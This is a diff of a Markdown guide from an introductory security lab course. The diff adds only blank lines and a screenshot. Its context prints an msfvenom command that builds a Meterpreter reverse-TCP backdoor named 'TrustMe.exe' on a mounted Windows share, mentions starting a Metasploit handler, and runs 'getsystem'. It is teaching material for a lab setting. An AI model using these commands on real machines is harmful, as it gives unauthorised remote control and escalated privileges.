@@ -150,6 +150,7 @@ We need to run the following commands in order to mount our remote system to the
 **REMEMBER - YOUR IP ADDRESS AND PASSWORD WILL BE DIFFERENT.**
 
 
+
 Run the following command to navigate into the mounted directory:
 
 <pre>cd /mnt/windows-share</pre>
@@ -166,6 +167,10 @@ Before we run the next commands, we need to get the IP of our Kali System (AKA o
 Run the following commands to start a simple backdoor and backdoor listener: 
 
 <pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe</pre>
+
+<img width="646" height="148" alt="image" src="https://github.com/user-attachments/assets/d84a0070-9c3f-47cb-b1b4-ea447ddbdeef" />
+
+
 
 Let's start the **Metasploit** Handler.  Open a new **Kali** terminal by clicking the **Kali** icon in the taskbar.
 
@@ -273,6 +278,7 @@ meterpreter >`getsystem`
 ![](attachments/Clipboard_2020-06-15-13-56-34.png)
 
 [Return To Lab List](https://github.com/strandjs/IntroLabs/blob/master/IntroClassFiles/navigation.md)
+
 
 
 
